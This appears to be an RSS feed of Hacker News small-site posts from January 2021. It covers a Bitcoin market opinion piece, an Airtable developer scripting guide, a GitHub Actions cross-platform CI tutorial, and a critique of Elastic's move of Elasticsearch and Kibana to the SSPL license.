<p>The March 2020 stock market crash showed that Bitcoin is a “risk on” asset. Bitcoin crashed along with almost everything else. With increasing institutional demand comes increased correlation to other risky assets like stocks. Tether can print all they want, but they are not immune from macroeconomic forces. If the stock market crashes again, Bitcoin will certainly tumble with it. From mid February to mid March of 2020 Bitcoin crashed more than 60% from $10,500 to $4,000. Since the market lows, SPY is up ~200% while Bitcoin is up 1,300%. If returns are amplified on the way up, they will be amplified on the way down as well. Investing in Bitcoin at its current price level should provide similar returns as investing in Tesla stock, Apple calls or SPY calls. Conversely, shorting Bitcoin at these levels should provide similar returns as shorting Tesla stock or buying puts on Apple or SPY.</p>



<figure><img loading="lazy" width="656" height="402" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=656%2C402&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=1024%2C627&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=300%2C184&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=768%2C470&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?w=1488&amp;ssl=1 1488w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p><strong>Is Bitcoin headed higher or lower?</strong></p>



<p>I have no idea. Please stop DMing me and asking me. These are the indicators that I look at:</p>



<ol><li>USDT Price or CoinbaseBTC/BitfinexBTC is <strong>bullish</strong>.</li><li>USDT Supply Changes is <strong>very</strong> <strong>bullish</strong>.</li><li>Miner Revenue is <strong>bearish</strong>, but more than offset by USDT supply increases.</li><li>Google Trends is <strong>neutral</strong>, but flashing warning signs of going very bearish any day now.</li><li>Stocks are <strong>bearish</strong> and overbought in the short and long term by almost any indicator you look at.</li><li>Government regulation is <strong>very bearish</strong> in the long term. Eventually Tether will get shutdown. I have no idea when.</li></ol>



<p>Overall, I am short term (days to weeks) bullish and long term (weeks to months) bearish on Bitcoin. It is way too early to short. I would wait for the USDT:USD 1:1 peg to break for a sustained period of time which would shutdown the Tether printer. It is also very risky to go long here. There is probably a little upside left in this bubble, but there is tremendous risk to the downside. 50k and 10k price targets are both likely to be hit in the near term. In the longer term, 100k and 5k are both quite possible.</p>



<p>If you found this post helpful, tips are always appreciated, but never expected. Best of luck and happy trading.</p>



<p>BTC: 37w2snDeY2DPVaxFYtUhsS6wzucbybTGvx</p>



<p>ETH: 0xD6b3F223d33AAaFbbFd3Ca52F5C12F021243F496</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

		<!-- .entry-auhtor -->
	</article></div>]]>
            </description>
            <link>https://sellthedip.com/will-bitcoin-will-go-up-or-down/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782222</guid>
            <pubDate>Thu, 14 Jan 2021 20:44:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Turing Machine]]>
            </title>
            <description>
<![CDATA[
Score 45 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25782120">thread link</a>) | @mr_tyzic
<br/>
January 14, 2021 | https://brandondong.github.io/css-turing-machine/ | <a href="https://web.archive.org/web/*/https://brandondong.github.io/css-turing-machine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://brandondong.github.io/css-turing-machine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782120</guid>
            <pubDate>Thu, 14 Jan 2021 20:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Developer's Guide to Airtable]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781916">thread link</a>) | @_acco
<br/>
January 14, 2021 | https://blog.syncinc.so/dev-guide | <a href="https://web.archive.org/web/*/https://blog.syncinc.so/dev-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>You might have missed <a href="https://blog.airtable.com/airtable-platform-launch-automations-sync-apps/">the memo</a>: Airtable is ready for developers.</p><p>In the span of a year, Airtable went from a simple <a href="https://airtable.com/api">REST API</a> to now supporting <a href="https://airtable.com/developers/scripting">scripting</a>, a <a href="https://airtable.com/developers/apps">custom apps SDK</a>, built in <a href="https://support.airtable.com/hc/en-us/articles/360050974153-Automations-Overview">automations</a>, and a small but growing ecosystem of <a href="https://airtable.com/marketplace">third-party tools and services</a>.</p><p>As a developer looking to build on Airtable, where should you start? And what is the developer experience like?</p><p>This guide aims to help developers navigate Airtable and build great applications on this growing platform.</p><h2><em>In</em> or <em>on</em> Airtable?</h2><p>Who is your user and what do they need? This age-old question is still the first one to ask as you begin to consider which Airtable developer tools to use.</p><p>At a high-level, you can classify Airtable's suite of <a href="https://airtable.com/developers">developer tools</a> as either supporting use cases that happen inside the Airtable interface (i.e. <em>in</em> Airtable) or outside Airtable in another app or tool (i.e. <em>on</em> Airtable).</p><p><img src="https://blog.syncinc.so/dev-guide/031_in_or_on.png" alt="in or on diagram"></p><p>When you are building <em>in</em> Airtable, the user is logged into Airtable and using your software within the Airtable interface. For any code you want to run <em>in</em> Airtable you'll be using either scripts, automations, or the custom app SDK.</p><blockquote><p>Note: Yes, I know, automations can trigger actions outside of Airtable. But by and large, the end user is <em>in</em> Airtable.</p></blockquote><p>If you are building <em>on</em> Airtable, then you are building for users outside of Airtable. This might be a custom internal tool, a dashboard built in Google Data Studio, a public Next.js website, or inside another SaaS application all together. In these use cases, you'll be using the Airtable REST API directly or using a tool like the one I helped build - <a href="https://syncinc.so/?utm_source=blog&amp;utm_medium=post&amp;utm_campaign=at-dev-guide">Sync Inc</a>.</p><p>As you decide whether to build <em>in</em> on <em>on</em> Airtable, you should consider what <a href="https://airtable.com/pricing">Airtable plan</a> your users are on as well. The REST API is available on every plan to every Airtable user. Automations are available on every plan, but capped at different limits. Meanwhile, scripts and custom apps are only available on pro and enterprise plans.</p><p><img src="https://blog.syncinc.so/dev-guide/020_pricing.png" alt="pricing"></p><blockquote><p>Note: Airtable Apps were formerly known as <em>Airtable Blocks</em>. The new name is slowly catching on but you'll still see the term <em>blocks</em> pop up here and there.</p></blockquote><p>Lastly, as your considering whether to build <em>in</em> or <em>on</em> Airtable, consider the functionality you need. When building <em>in</em> Airtable, you will face a couple constraints when working with 3rd party APIs, caching data, or manipulating the UI.</p><h2>Airtable's data quirks</h2><p>It's worth touching on Airtable's data model.</p><p>From a developer's perspective, Airtable is basically a hosted database fused to an easy interface for creating and managing data. This easy-to-use interface means the database schema is super flexible. Tables, columns, and field types can emerge, change, or disappear at anytime. Airtable is highly valuable because of this flexibility, but it also makes developing on Airtable a bit more unpredictable.</p><p>Additionally, as a data store, Airtable supports all sorts of <a href="https://airtable.com/developers/scripting/api/cell_values">data types</a>. Most of these data types are familiar and predictable.</p><p>However, two of these data types - <code>lookups</code> and <code>formulas</code> - can take the form of any other type. This makes sense given how Airtable works: if a formula is concatenating text, then its result is a string. If it is summing numbers, then its result is a number. This means the data type of these fields is a black box, sort of like the <code>any</code> type in TypeScript.</p><p>As a #protip to deal with Airtable's data flexibility, I highly recommend developing on a "staging" copy of the Airtable base you are working with. This helps reduce the likelihood that an end user will change data as you build. And, of course, this allows you to break things, a hallmark of a great development process. Airtable can duplicate a base remarkably fast (especially when you think about what's happening under the hood!) - so use this to your advantage.</p><p><img src="https://blog.syncinc.so/dev-guide/021_duplicate.png" alt="duplicate"></p><p>So: Which of the many options should you use to build on Airtable? Let's first consider building <em>in</em> Airtable with Airtable scripts.</p><h2>Airtable scripts: little record robots</h2><p><a href="https://airtable.com/developers/scripting">Airtable scripts</a> are short JavaScript snippets that allow you to manipulate data in your Airtable base.</p><p>You can do just about anything to the data in your base that is made possible with the standard JavaScript library. There are a couple limits:</p><ol><li>You can't import other JS libraries. You can copy and paste smaller, minified libraries that fit into one file - but it's usually a stretch.</li><li>You can't touch the DOM.</li><li>You can't change the schema of the base. You can't, for example, create new tables or views.</li></ol><p>To use scripts, you need to add the <em>scripting app</em> (f.k.a <em>scripting block</em>) to your base. This means you need to be on either the Pro or Enterprise Airtable plans.</p><p>It's also worth noting that Airtable now allows developers to share (no selling yet!) scripts in the <a href="https://airtable.com/marketplace/category/scripts">Airtable marketplace</a>. So if you write a killer script that is agnostic to a base, the entire community can benefit. In the marketplace you'll find all sorts of great script examples (in addition to those in the <a href="https://airtable.com/developers/scripting/examples">docs</a>).</p><h3>Elements of a script</h3><p>Before diving into a hands-on example, unpacking the building blocks of Airtable scripts will set the foundation for the rest of this guide.</p><p><strong>Getting data from the base</strong></p><p>Virtually every script (or automation/app for that matter) is going to start off by pulling data from an Airtable base.</p><p>Airtable follows a pretty straightforward relational model. Let's briefly step through it:</p><p>An Airtable workspace can contain many Airtable bases. Your script will run within one of these bases.</p><p>To add a script to a base, you'll install the <a href="https://support.airtable.com/hc/en-us/articles/360043041074-Scripting-app-overview"><strong>Scripting App</strong></a> in your base.</p><p>Then, to access information about the base in a script you'll use the <a href="https://airtable.com/developers/scripting/api/base">base model</a>.</p><p>For instance, if you pop open the scripting app, you can quickly retrieve the name of the Airtable base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>The name of my base is </span><span>${</span><span>base</span><span>.</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>Or, get the number of tables in the base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>This base contains </span><span>${</span><span>base</span><span>.</span><span>tables</span><span>.</span><span>length</span><span>}</span><span> tables.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>As the prior query indicates, a base can contain many tables. You can interact with tables using the <a href="https://airtable.com/developers/scripting/api/table">table model</a>. So when you want to work with a table you retrieve it from the base:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p></pre><p>Once you have a table loaded into your script, you can access its <a href="https://airtable.com/developers/scripting/api/view">views</a>, <a href="https://airtable.com/developers/scripting/api/field">fields</a> and <a href="https://airtable.com/developers/scripting/api/record">records</a>.</p><p>A view is simply a filtered set of data in the table. So let's say you want to just pull all the records from a particular view:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p></pre><p>The variable <code>query</code> is now going to contain all the records from the <code>Todo</code> view.</p><p>Now, when you want to inspect just one <code>Todo</code> record, you'll use the <a href="https://airtable.com/developers/scripting/api/record#get-cell-value"><code>getCellValue()</code> function</a>. As so:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> record </span><span>=</span><span> query</span><span>.</span><span>records</span><span>[</span><span>0</span><span>]</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>record</span><span>.</span><span>getCellValue</span><span>(</span><span>"Description"</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/032_script_example.png" alt="Script example"></p><p>This quickly outlines the practical methods for pulling data from the base. You'll find that Airtable scripts includes some other models to get information on the user (a.k.a collaborator), session and more in the <a href="https://airtable.com/developers/scripting">docs</a>. But retrieving tables and records is the crux of working with data in Airtable.</p><p><strong>Collecting input from the user</strong></p><p>Beyond pulling data from the Airtable base, you'll also want to retrieve inputs from the user.</p><p>You may want to prompt the user for which table they want to evaluate in the script or which file they want to import. To do so, you'll use the <a href="https://airtable.com/developers/scripting/api/input">input object</a>. All input methods are asynchronous, so you'll always prefix each function call with <code>await</code>.</p><p>For instance, to ask the user their name:</p><pre><p><span>let</span><span> name </span><span>=</span><span> </span><span>await</span><span> input</span><span>.</span><span>textAsync</span><span>(</span><span>"What is your name?"</span><span>)</span><span>;</span><span></span></p><p><span>output</span><span>.</span><span>text</span><span>(</span><span>`</span><span>Your name is </span><span>${</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/033_name_prompt.png" alt="Name prompt"></p><p>You can have users enter text, click a button, select a table, view, field, or even a record. Combined, these inputs allow your script to interact with the user in all sorts of ways.</p><p><strong>Fetching data from an API</strong></p><p>In addition to collecting data from the Airtable base and user, you can also <a href="https://airtable.com/developers/scripting/api/fetch">fetch data</a> from third-party APIs.</p><pre><p><span>let</span><span> response </span><span>=</span><span> </span><span>await</span><span> </span><span>fetch</span><span>(</span><span>"https://api.github.com/orgs/Airtable"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>await</span><span> response</span><span>.</span><span>json</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p>If the API you are calling requires authentication, your authentication token will be sitting right in the script. Keep in mind that users can view the underlying code in your script! If you don't trust the user, don't use an API fetch in your script.</p><p>Lastly, when using fetch, consider that <a href="https://airtable.com/developers/scripting/api/fetch#differences-from-fetch-in-the-browser">Airtable is not providing you with full fledge browser fetch</a>.</p><p><strong>Presenting data to the user</strong></p><p>Last but not least, after collecting data from the Airtable base, user or third-party API you'll then process that data and either update data in the base (using the table model functions of <code>createRecordAsync()</code>, <code>updateRecordAsync()</code>, or <code>deleteRecordAsync()</code>) or present data to the user.</p><p>To present a value to the user, you'll use the <a href="https://airtable.com/developers/scripting/api/output"><code>output</code> object</a>. You might output information as the scripts run to keep your user informed or to present a final results. Here is a simple "Hello, world!":</p><pre><p><span>output</span><span>.</span><span>markdown</span><span>(</span><span>"Hello, *world*!"</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/034_output.png" alt="Output"></p><p>You can present the user plain text, markdown, or a table.</p><h3>Writing a script</h3><p>Now, let's write a quick script to put these ideas to work.</p><p>To play along with this example (and make this post more enjoyable), you can add <a href="https://airtable.com/templates/sales-and-customers/expvjTzYAZareV1pt/sales-crm">this Sales CRM base template</a> to your workspace by clicking the <strong>Use Template</strong> button.</p><p>This template base is a simple Airtable CRM for tracking sales. As an example, let's say you want to write a script to calculate the current value of all open opportunities in the sales pipeline. This will give you a sense of how much potential revenue is available to the company. To do so, you want to sum up the <code>Estimated Value</code> for all deals that are active - that is, not yet won nor lost.</p><p>First, add the scripting app to the base by clicking the <strong>APPS</strong> button and selecting <strong>+ Install an app</strong>:</p><p><img src="https://blog.syncinc.so/dev-guide/001_add_app.png" alt="Add app"></p><p>Select the <strong>Scripting</strong> app.</p><p><img src="https://blog.syncinc.so/dev-guide/002_select_scripting.png" alt="Scripting app"></p><p>Apps live in Airtable dashboards. So click <strong>Install app</strong> and select the <strong>Sales CRM HQ</strong> dashboard.</p><p><img src="https://blog.syncinc.so/dev-guide/003_select_dash.png" alt="Scripting app"></p><p>The scripting app will now open. Start with a blank slate by deleting the <code>Hello, World</code> example that is pre-loaded.</p><p>Now, write your script. Initiate a variable that will store the total value of the pipeline. You can call it <code>pipeline_value</code>:</p><pre><p><span>let</span><span> …</span></p></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.syncinc.so/dev-guide">https://blog.syncinc.so/dev-guide</a></em></p>]]>
            </description>
            <link>https://blog.syncinc.so/dev-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781916</guid>
            <pubDate>Thu, 14 Jan 2021 20:19:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Switch your cross-platform CI to GitHub Actions in 5 minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781702">thread link</a>) | @mceachen
<br/>
January 14, 2021 | https://photostructure.com/coding/switch-to-github-actions/ | <a href="https://web.archive.org/web/*/https://photostructure.com/coding/switch-to-github-actions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>If you maintain an open source project that’s hosted on GitHub, and you’re
frustrated by one or more of your current <a href="https://en.wikipedia.org/wiki/Continuous_integration">continuous
integration</a> (CI)
providers, <strong>good news</strong>: <a href="https://github.com/features/actions">GitHub Actions</a>
is a free CI service that supports running tests and other tasks on macOS,
Windows, and Linux.</p>
<p>Note that <a href="https://docs.github.com/en/free-pro-team@latest/actions/guides">many runtimes are supported by GitHub
Actions</a>. This
post includes some Node.JS-specific tips.</p>
<h2 id="whats-wrong-with-githubs-docs">What’s wrong with GitHub’s docs?<a href="#whats-wrong-with-githubs-docs" arialabel="Anchor"> #</a> </h2>
<p>GitHub’s
<a href="https://docs.github.com/en/free-pro-team@latest/actions/quickstart">quickstart</a>
and <a href="https://docs.github.com/en/free-pro-team@latest/actions/guides/building-and-testing-nodejs">setup
docs</a>
are a good start for building and testing against the <a href="https://nodejs.org/en/about/releases/">currently supported
versions of Node.JS</a>, but if your code
has any OS-specific code, these docs don’t tell you how to set up cross-platform
builds, and sometimes just knowing what to search for is the biggest stumbling
block.</p>
<p>Setting up cross-platform, cross-version builds is easy, though:</p>
<h2 id="add-a-new-workflow">Add a new workflow<a href="#add-a-new-workflow" arialabel="Anchor"> #</a> </h2>
<p>Either click the GitHub Actions tab, and click the “New workflow” button:</p>
<figure>
<img src="https://photostructure.com/img/2021/01/actions-tab.png" alt="GitHub Actions tab"> <figcaption>
<p>GitHub Actions tab</p>
</figcaption>
</figure>
<p>Or, if you’d rather do it manually, edit a new file called
<code>.github/workflows/node.js.yml</code> from the base of your project repository.</p>
<p>Then replace the contents of the file with this:</p>
<div><pre><code data-lang="yml"><span>name</span><span>:</span><span> </span><span>Node.js CI</span><span>
</span><span></span><span>on</span><span>:</span><span>
</span><span>  </span><span>push</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span><span>master]</span><span>
</span><span>  </span><span>pull_request</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span><span>master]</span><span>
</span><span></span><span>jobs</span><span>:</span><span>
</span><span>  </span><span>build</span><span>:</span><span>
</span><span>    </span><span>runs-on</span><span>:</span><span> </span><span>${{ matrix.os }}</span><span>
</span><span>    </span><span>strategy</span><span>:</span><span>
</span><span>      </span><span>matrix</span><span>:</span><span>
</span><span>        </span><span>os</span><span>:</span><span> </span><span>[</span><span>ubuntu-latest, macos-latest, windows-latest]</span><span>
</span><span>        </span><span>node-version</span><span>:</span><span> </span><span>[</span><span>10.</span><span>x, 12.x, 14.x, 15.x]</span><span>
</span><span>    </span><span>steps</span><span>:</span><span>
</span><span>      </span>- <span>uses</span><span>:</span><span> </span><span>actions/<a href="https://photostructure.com/cdn-cgi/l/email-protection" data-cfemail="e88b808d8b83879d9ca89eda">[email&nbsp;protected]</a></span><span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span><span>Use Node.js ${{ matrix.node-version }}</span><span>
</span><span>        </span><span>uses</span><span>:</span><span> </span><span>actions/<a href="https://photostructure.com/cdn-cgi/l/email-protection" data-cfemail="b8cbddcccdc895d6d7dcddf8ce89">[email&nbsp;protected]</a></span><span>
</span><span>        </span><span>with</span><span>:</span><span>
</span><span>          </span><span>node-version</span><span>:</span><span> </span><span>${{ matrix.node-version }}</span><span>
</span><span>      </span>- <span>run</span><span>:</span><span> </span><span>npm ci</span><span>
</span><span>      </span>- <span>run</span><span>:</span><span> </span><span>npm test</span><span>
</span></code></pre></div><p><em>Note that this assumes you’re using</em> <code>npm</code> <em>and have a</em> <code>package-lock.json</code>. <em>If
you’re a</em> <code>yarn</code> <em>user, check out <a href="#yarn">Tip #2</a>.</em></p>
<p>There’s a bunch going on there, but the magick bits to
<a href="https://en.wikipedia.org/wiki/Grok">grok</a> are the <code>strategy.matrix:</code>,
<code>runs-on:</code>, and <code>with:</code> keys.</p>
<p>As soon as you commit this and push to GitHub, you should see a build summary
show up in your Actions tab:</p>
<figure>
<img src="https://photostructure.com/img/2021/01/actions-summary.png" alt="GitHub Actions build summary"> <figcaption>
<p>GitHub Actions build summary</p>
</figcaption>
</figure>
<p>You’ll see that the build matrix will include every combination of <code>os</code> and
<code>node-version</code> specified in <code>jobs.build.strategy.matrix</code>, which in this case,
was 12 different builds.</p>
<h2 id="tip-1-customizing-the-build-matrix">Tip 1: Customizing the build matrix<a href="#tip-1-customizing-the-build-matrix" arialabel="Anchor"> #</a> </h2>
<p>GitHub’s <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions#jobsjob_idstrategymatrix"><code>jobs.&lt;job_id&gt;.strategy.matrix</code>
reference</a>
describes how to include or exclude specific OSes and/or Node versions in your
build matrix.</p>

<h2 id="tip-2-how-to-use-yarn-instead-of-npm">Tip 2: How to use yarn instead of npm<a href="#tip-2-how-to-use-yarn-instead-of-npm" arialabel="Anchor"> #</a> </h2>
<p>GitHub’s own runners actually install <code>yarn</code> by default, so (almost) all that
you need to do is switch out <code>npm</code> for <code>yarn</code> in your workflow.</p>
<p>If you’re not aware, <code>npm ci</code> does the following:</p>
<ol>
<li>Recursively deletes the <code>node_modules</code> directory</li>
<li>Runs <code>npm install</code>, but only uses the exact versions specified in the
<code>package-lock.json</code>. If <code>package-lock.json</code> is missing, <code>npm ci</code> will fail.</li>
</ol>
<p>If you’re using <code>yarn</code> (and not using Windows), you can simulate this by adding
the following scripts to your <code>package.json</code>:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>...</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>...</span>
    <span>"preci"</span><span>:</span> <span>"rm -rf node_modules"</span><span>,</span>
    <span>"ci"</span><span>:</span> <span>"yarn install --frozen-lockfile"</span>
    <span>...</span>
  <span>}</span>
<span>}</span>
</code></pre></div><p><em>Note that this</em> <code>preci</code> <em>script won’t work if you’re building on Windows. For
cross-platform modules, I’m just cheating and skipping over the node_modules
cleanup step.</em></p>
<h2 id="tip-3-add-or-replace-your-ci-build-badge">Tip 3: Add or replace your CI build badge<a href="#tip-3-add-or-replace-your-ci-build-badge" arialabel="Anchor"> #</a> </h2>
<p>From the Actions tab, click a build summary, and in the upper right, click <code>…</code>,
and then click “Create status badge.”</p>
<p>If you’re building a badge for your README, you want to pick your release branch
(so, <code>main</code> or <code>master</code>).</p>
<p><strong>Unfortunately, the markdown that gets displayed is <em>just the image</em></strong>, so if you paste the
markdown into your <code>README.md</code>, and someone clicks the build badge, it navigates
to the badge image, not the build (!!).</p>
<p>It’s up to you to add a proper link to the build badge: wrap the markdown from
the “Create status badge” tool with square brackets, and then add a reasonable
destination link, in parenthesis, right after the square brackets.</p>
<p>You’ll end up with something like this:</p>
<pre><code>[![CI build](https://github.com/.../badge.svg)](https://github.com/.../actions)
</code></pre><h2 id="all-together-now">All together now<a href="#all-together-now" arialabel="Anchor"> #</a> </h2>
<p><a href="https://github.com/photostructure/exiftool-vendored.js/commit/952d34246f24d7586e669460bd34bb1d3aa90543">Here’s a commit</a> that</p>
<ul>
<li>switches to GitHub Actions,</li>
<li>removes the other CI build configurations,</li>
<li>updates the build badge in the <code>README.md</code>, and</li>
<li>adds a <code>yarn ci</code> job (without the <code>preci</code> step)</li>
</ul>
<p>My prior CI for this build matrix could take 30 minutes or more to complete, and
required using two different services.</p>
<p>GitHub Actions completes this same matrix in only 6 minutes: ✨ Kudos, GitHub! ✨</p>
<ul>
<li>
<a href="https://photostructure.com/tags/docs" title="See other Docs posts">Docs</a>
</li>
<li>
<a href="https://photostructure.com/tags/coding" title="See other Coding posts">Coding</a>
</li>
</ul>
<div>
<p><img src="https://photostructure.com/img/2020/08/mrm-256w.jpg" alt="Photo of Matthew McEachen" width="128" height="128"></p><p>
Hi! I’m Matthew, the author of
<a href="https://photostructure.com/why/" title="Read about why I'm writing PhotoStructure">PhotoStructure</a>.
<span>I’m a dad, amateur photographer, and author of
<a href="https://github.com/mceachen" target="_blank" title="GitHub.com/McEachen">open source</a>,
<a href="https://web.archive.org/web/20110603234753/http://adgrok.com/" target="_blank" title="AdGrok (2011)">adtech</a>, fintech, and
<a href="https://web.archive.org/web/19980626214606/http://www.tenthplanet.com/Products/Next.html#Literacy" target="_blank" title="Tenth Planet (1998)">edtech</a>
software since the turn of the millennium. He/him.</span>
I am building a self-hosted, safe, and fast new home for all your photos and
videos.<br>
<b>Your memories deserve PhotoStructure.
<a href="https://photostructure.com/#mc_embed_signup">Sign up and try it today</a>.</b>
</p>
</div></article></div>]]>
            </description>
            <link>https://photostructure.com/coding/switch-to-github-actions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781702</guid>
            <pubDate>Thu, 14 Jan 2021 20:03:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25781695">thread link</a>) | @vmbrasseur
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

